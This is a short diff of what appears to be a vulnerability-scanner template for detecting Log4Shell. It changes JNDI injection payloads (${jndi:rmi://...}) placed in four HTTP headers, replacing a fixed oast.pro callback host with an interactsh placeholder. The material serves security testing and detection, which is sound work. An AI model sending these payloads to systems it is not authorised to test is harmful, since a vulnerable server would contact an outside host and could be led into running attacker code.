@@ -11,10 +11,10 @@ requests:
   - |+
     GET / HTTP/1.1
     Host: {{Hostname}}
-    User-agent: ${jndi:rmi://{{Hostname}}.b3ee9884d98b98e17c70gta9oheyyyyyb.oast.pro/a}
-    X-Forwarded-For: ${jndi:rmi://{{Hostname}}.b3ee9884d98b98e17c70gta9oheyyyyyb.oast.pro/a}
-    Referer: ${jndi:rmi://{{Hostname}}.b3ee9884d98b98e17c70gta9oheyyyyyb.oast.pro/a}
-    X-Api-Version: ${jndi:rmi://{{Hostname}}.b3ee9884d98b98e17c70gta9oheyyyyyb.oast.pro/a}
+    User-agent: ${jndi:rmi://{{Hostname}}.{{interactsh-url}}/a}
+    X-Forwarded-For: ${jndi:rmi://{{Hostname}}.{{interactsh-url}}/a}
+    Referer: ${jndi:rmi://{{Hostname}}.{{interactsh-url}}/a}
+    X-Api-Version: ${jndi:rmi://{{Hostname}}.{{interactsh-url}}/a}
 
   matchers:
   - type: word
